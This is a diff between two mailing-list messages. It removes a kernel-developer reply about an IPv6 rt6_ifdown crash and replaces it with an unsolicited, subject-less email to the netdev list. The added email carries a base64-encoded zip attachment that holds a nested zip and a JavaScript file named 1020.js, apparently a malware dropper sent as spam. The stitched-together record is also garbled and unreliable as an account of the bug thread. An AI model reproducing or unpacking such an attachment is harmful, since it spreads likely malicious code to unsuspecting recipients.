@@ -1,51 +1,79 @@
-From: Cong Wang <xiyou.wangcong@gmail.com>
-Subject: Re: net/ipv6: GPF in rt6_ifdown
-Date: Wed, 21 Jun 2017 13:08:39 -0700
-Message-ID: <CAM_iQpWeWTqBzjj1iju_Vxr5vgr58wRUn-xuSrLqmsd98HpxcQ@mail.gmail.com>
-References: <CAAeHK+z0TdpY83FiMtHBMChEQgE+0-+8roNFVzM5Uo-duCgpVA@mail.gmail.com>
- <CAAeHK+wuKeG6HhvuP89DNXYE+Okq7HDdJ+OgYGoK+FN-k=w+fA@mail.gmail.com> <CAAeHK+xGdXtfTxNE0g71-Ffkvj+6qy4At15WisvBbXMQ4EUqNQ@mail.gmail.com>
+From: <morice.diane@gmail.com>
+Subject: (unknown)
+Date: Wed, 21 Jun 2017 20:10:20 -0000
+Message-ID: <149807582030.30693.7861029337697697383@poneytelecom.eu>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Cc: "David S. Miller" <davem@davemloft.net>,
-        Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>,
-        James Morris <jmorris@namei.org>,
-        Hideaki YOSHIFUJI <yoshfuji@linux-ipv6.org>,
-        Patrick McHardy <kaber@trash.net>,
-        netdev <netdev@vger.kernel.org>,
-        LKML <linux-kernel@vger.kernel.org>,
-        Eric Dumazet <edumazet@google.com>,
-        David Ahern <dsa@cumulusnetworks.com>,
-        Dmitry Vyukov <dvyukov@google.com>,
-        Kostya Serebryany <kcc@google.com>,
-        syzkaller <syzkaller@googlegroups.com>
-To: Andrey Konovalov <andreyknvl@google.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <CAAeHK+xGdXtfTxNE0g71-Ffkvj+6qy4At15WisvBbXMQ4EUqNQ@mail.gmail.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="281270036887.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 212-129-3-98.rev.poneytelecom.eu ([212.129.3.98]:37236 "HELO
+        poneytelecom.eu" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751106AbdFUUKY (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Wed, 21 Jun 2017 16:10:24 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Wed, Jun 21, 2017 at 10:53 AM, Andrey Konovalov
-<andreyknvl@google.com> wrote:
-> On Wed, Jun 21, 2017 at 3:09 PM, Andrey Konovalov <andreyknvl@google.com> wrote:
->> On Wed, Jun 21, 2017 at 2:08 PM, Andrey Konovalov <andreyknvl@google.com> wrote:
->>> Hi,
->>>
->>> I've got the following error report while fuzzing the kernel with syzkaller.
->>>
->>> On commit 9705596d08ac87c18aee32cc97f2783b7d14624e (4.12-rc6+).
->>>
->>> It might be related to:
->>> https://groups.google.com/forum/#!topic/syzkaller/ZJaqAiFLe3k
->>>
->>> I only have a reproducer in the form of a syzkaller program, attached
->>> together with my .config.
->>
->> I now have a C reproducer as well, attached.
->
-> And here's a much simpler reproducer.
-
-Thanks a lot for your reproducer!
-
-I added a few printk's, and find that we somehow have rt->rt6i_idev set
-to NULL but still keep it in the uncached list. ip6_dst_destroy() unlinks
-it before NULL'ing, so it should not be that case.
+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
+AAEAAQBOAAAABw0AAAAA
